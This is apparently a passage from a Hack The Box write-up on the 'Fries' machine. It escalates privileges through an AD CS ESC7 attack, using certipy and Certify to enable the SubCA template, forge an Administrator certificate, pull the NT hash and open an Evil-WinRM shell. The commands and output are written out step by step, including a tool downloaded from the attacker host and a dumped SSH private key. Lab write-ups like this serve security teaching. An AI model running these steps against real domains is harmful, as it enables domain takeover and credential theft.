RustHound-CE Enumeration Completed at 16:34:42 on 11/26/25! Happy Graphing!
```

GUI:

![Pasted image 20251126164538.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251126164538.png)

Now we have 4 `Outbound Object Control` over EnterpriseCA `fries-DC01-CA`  and the templates. 

![Pasted image 20251126165705.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251126165705.png)

For `svc_infra` account:

![Pasted image 20251126183410.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251126183410.png)

This user is in the `Domain Users` group and can `Enroll` on the `User` template.
## GMSA_CA_PROD$ to Administrator (AD CS)

### Enumerate Certificate Templates

Find vulnerable templates / list templates:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ certipy-ad find -u 'gMSA_CA_prod@fries.htb' -dc-ip '10.10.11.96' -k -target dc01.fries.htb -vulnerable -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Saving text output to '20251125184237_Certipy.txt'
[*] Wrote text output to '20251125184237_Certipy.txt'
[*] Saving JSON output to '20251125184237_Certipy.json'
[*] Wrote JSON output to '20251125184237_Certipy.json'

┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ cat 20251125184237_Certipy.json 
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "fries-DC01-CA",
      "DNS Name": "DC01.fries.htb",
      "Certificate Subject": "CN=fries-DC01-CA, DC=fries, DC=htb",
      "Certificate Serial Number": "26117C1FFA5705AF443B7E82E8C639A9",
      "Certificate Validity Start": "2025-11-18 05:39:18+00:00",
      "Certificate Validity End": "3024-05-19 14:11:46+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Disabled Extensions": [
        "1.3.6.1.4.1.311.25.2"
      ],
      "Permissions": {
        "Owner": "FRIES.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "FRIES.HTB\\gMSA_CA_prod",
            "FRIES.HTB\\Domain Admins",
            "FRIES.HTB\\Enterprise Admins",
            "FRIES.HTB\\Administrators"
          ],
          "512": [
            "FRIES.HTB\\gMSA_CA_prod",
            "FRIES.HTB\\Domain Users",
            "FRIES.HTB\\Domain Computers",
            "FRIES.HTB\\Authenticated Users"
          ],
          "2": [
            "FRIES.HTB\\Domain Admins",
            "FRIES.HTB\\Enterprise Admins",
            "FRIES.HTB\\Administrators"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "FRIES.HTB\\gMSA_CA_prod",
        "FRIES.HTB\\Authenticated Users",
        "FRIES.HTB\\Domain Computers",
        "FRIES.HTB\\Domain Users"
      ],
      "[+] User ACL Principals": [
        "FRIES.HTB\\gMSA_CA_prod"
      ],
      "[!] Vulnerabilities": {
        "ESC7": "User has dangerous permissions.",
        "ESC16": "Security Extension is disabled."
      },
      "[*] Remarks": {
        "ESC16": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."
      }
    }
  },
  "Certificate Templates": "[!] Could not find any certificate templates"
```

We can try `ESC7` on `SubCA` but we have to set it up.
### Setting up ESC7

**MUST READ**

https://bloodhound.specterops.io/resources/edges/manage-ca

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

We have to use the `Certify.exe`  to adjust some CA settings for user supplied SAN and to disable security check so you can also supply SID with `gMSA` account
 https://github.com/GhostPack/Certify.git
#### Compile Certify.exe v2.0.0

This can be done with `Visual Studio` on [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md), you can use a VM if you don't own a Windows system:

```bash
─$ git clone https://github.com/GhostPack/Certify.git
─$ cd Certify 
─$ cd Certify
─$ cat Certify.csproj
<TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
```

After the `Visual Studio` compilation we can transfer the files on our machine: 

```bash
─$ ls                                   
CommandLine.dll Certify.exe
```
#### Transfer and Use Certify.exe

Host server:

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 "GET /Certify.exe HTTP/1.1" 200 -
 "GET /CommandLine.dll HTTP/1.1" 200 -
```

Download the files with `wget` on powershell:

```powershell
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> wget http://10.10.14.75/Certify.exe -o Certify.exe
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> wget http://10.10.14.75/CommandLine.dll -o CommandLine.dll

# Check if works
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> ./Certify.exe


ERROR(S):
  No verb selected.

  enum-cas            Enumerate certificate authorities
  enum-templates      Enumerate certificate templates
  enum-pkiobjects     Enumerate access controls for PKI objects
  request             Request a certificate
  request-agent       Request a certificate using a request agent
  request-download    Download a previously requested certificate
  request-renew       Renew a previously requested certificate
  forge               Create a 'golden certificate' using stolen CA keys
  manage-ca           Manage a certificate authority
  manage-template     Manage a certificate template
  manage-self         Manage the current machine


Certify completed in 00:00:00.2226322
```

We  use `Certify.exe` to remove from the deny list of `ManageCertificates` the `Domain Computers`, `Domain Users` and the user `gMSA_CA_prod$`:

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> ./Certify.exe manage-ca --ca dc01.fries.htb\fries-DC01-CA --officer S-1-5-21-858338346-3861030516-3975240472-1104

  v2.0.0
[*] Action: Manage a certificate authority
[*] Attempting to toggle role permissions on the CA.
[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-110
[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-110
[+] Successfully set the security descriptor on the CA.
Certify completed in 00:00:00.1736383


*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> ./Certify.exe manage-ca --ca DC01.fries.htb\fries-DC01-CA --officer S-1-5-21-858338346-3861030516-3975240472-513
[*] Action: Manage a certificate authority
[*] Attempting to toggle role permissions on the CA.
[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-513'.
[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-513'.
[+] Successfully set the security descriptor on the CA.
Certify completed in 00:00:00.1885113

*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> ./Certify.exe manage-ca --ca DC01.fries.htb\fries-DC01-CA --officer S-1-5-21-858338346-3861030516-3975240472-515
[*] Action: Manage a certificate authority
[*] Attempting to toggle role permissions on the CA.
[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-515'.
[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-515'.
[+] Successfully set the security descriptor on the CA.
Certify completed in 00:00:00.3407427


# Check changes (no DENY only ALLOW)

*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads\privesc> ./Certify enum-cas
 
 [*] Enterprise/enrollment certificate authorities:

    Enterprise CA Name            : fries-DC01-CA
    DNS Hostname                  : DC01.fries.htb
    FullName                      : DC01.fries.htb\fries-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=fries-DC01-CA, DC=fries, DC=htb
    Cert Thumbprint               : 0FDE266E3D674B5B37542D3E38699FFE2C93A662
    Cert Serial                   : 26117C1FFA5705AF443B7E82E8C639A9
    Cert Start Date               : 11/17/2025 9:39:18 PM
    Cert End Date                 : 5/19/3024 7:11:46 AM
    Cert Chain                    : CN=fries-DC01-CA,DC=fries,DC=htb
    User Specifies SAN            : Disabled
    RPC Request Encryption        : Enabled
    Vulnerabilities
      ESC7                        : The CA has insecure delegated security roles or permissions.
    CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544

      Access Rights                                     Principal
      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators             S-1-5-32-544
      Allow  ManageCA, ManageCertificates               FRIES\Domain Admins                S-1-5-21-858338346-3861030516-3975240472-512
      Allow  Enroll                                     FRIES\Domain Users                 S-1-5-21-858338346-3861030516-3975240472-513
      Allow  Enroll                                     FRIES\Domain Computers             S-1-5-21-858338346-3861030516-3975240472-515
      Allow  ManageCA, ManageCertificates               FRIES\Enterprise Admins            S-1-5-21-858338346-3861030516-3975240472-519
      Allow  ManageCA, Enroll                           FRIES\gMSA_CA_prod$                S-1-5-21-858338346-3861030516-3975240472-1104
    Enrollment Agent Restrictions : None
```
### ESC7 AD CS Privesc

**MUST READ**

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca

https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/adcs/#esc7

Request a ticket with [AES-256](../../../3%20-%20Tags/Hacking%20Concepts/AES-256.md) (preferred): 

```bash
─$ impacket-getTGT fries.htb/gMSA_CA_prod -aesKey ed5ace86edc26a17bac9a5c1b46e568d5d38bbeac6f9b01ed5051369fea5acd6 -dc-ip 10.10.11.96
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gMSA_CA_prod.ccache                                                                                            

─$ klist
Ticket cache: FILE:/home/mdn0x/HTB/Machines/Fries/root/windows/gMSA_CA_prod.ccache
Default principal: gMSA_CA_prod@FRIES.HTB

Valid starting       Expires              Service principal
25/11/2025 19:46:36  26/11/2025 05:46:36  krbtgt/FRIES.HTB@FRIES.HTB
        renew until 26/11/2025 19:46:36
```

*Note: from here all commands required two or more consecutive runs to not fail, the first always failed for my system.*

Now enable`SubCA` and `ESC7` :

```bash
─$ certipy-ad ca -u 'gMSA_CA_prod@fries.htb' -dc-ip '10.10.11.96' -k -ca 'fries-DC01-CA' -enable-template 'SubCA' -dc-host dc01.fries.htb -target dc01.fries.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'fries-DC01-CA'


─$ certipy-ad req -u 'gMSA_CA_prod@fries.htb' -dc-ip '10.10.11.96' -k -ca 'fries-DC01-CA' -template 'SubCA' -upn Administrator -target dc01.fries.htb -dc-host dc01.fries.htb -sid 'S-1-5-21-858338346-3861030516-3975240472-500' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 73
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '71.key'
[*] Wrote private key to '71.key'
[-] Failed to request certificate
```

Then retrieve the certificate with the `ID`:

```bash
└─$ certipy-ad ca -u 'gMSA_CA_prod@fries.htb' -dc-ip '10.10.11.96' -k -ca 'fries-DC01-CA' -issue-request 73 -dc-host dc01.fries.htb -target dc01.fries.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 73

─$ certipy-ad req -u 'gMSA_CA_prod@fries.htb' -dc-ip '10.10.11.96' -k -ca 'fries-DC01-CA' -target dc01.fries.htb -retrieve 73 -target dc01.fries.htb -dc-host dc01.fries.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 73
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '72.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Now we have `administrator.pfx`. Using this, we can retrieve the hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$  certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.96 -username Administrator -k -domain fries.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving Kirbi file to 'administrator.kirbi'
[*] Wrote Kirbi file to 'administrator.kirbi'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': HTB{REDACTED_HASH}
```

Crack the hash and get the administrator’s password or execute pass-the-hash attack, i will request a TGT:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ impacket-getTGT fries.htb/administrator:HTB{REDACTED_HASH} -hashes :HTB{REDACTED_HASH} -dc-ip 10.10.11.96
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Fries/root/windows/administrator.ccache 
```

Then use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md):

```powershell
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ evil-winrm -i dc01.fries.htb -k administrator.ccache -r FRIES.HTB  

Evil-WinRM shell v3.7


*Evil-WinRM* PS C:\Users\Administrator\.ssh> type id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBf+kAilxQUbCe5Ayk47TDiKwimECdTFCgX+anxcsi2+QAAAKC51yawudcm
sAAAAAtzc2gtZWQyNTUxOQAAACBf+kAilxQUbCe5Ayk47TDiKwimECdTFCgX+anxcsi2+Q
AAAEArtgb4BmUIa2zuFRlajrHTB{REDACTED_HASH}
-----END OPENSSH PRIVATE KEY-----


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/26/2025  12:14 PM             34 root.txt
-ar---       11/26/2025  12:14 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat user.txt
    HTB{REDACTED_FLAG}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
    HTB{REDACTED_FLAG}
```

Pwned !! This was at least an **INSANE** box.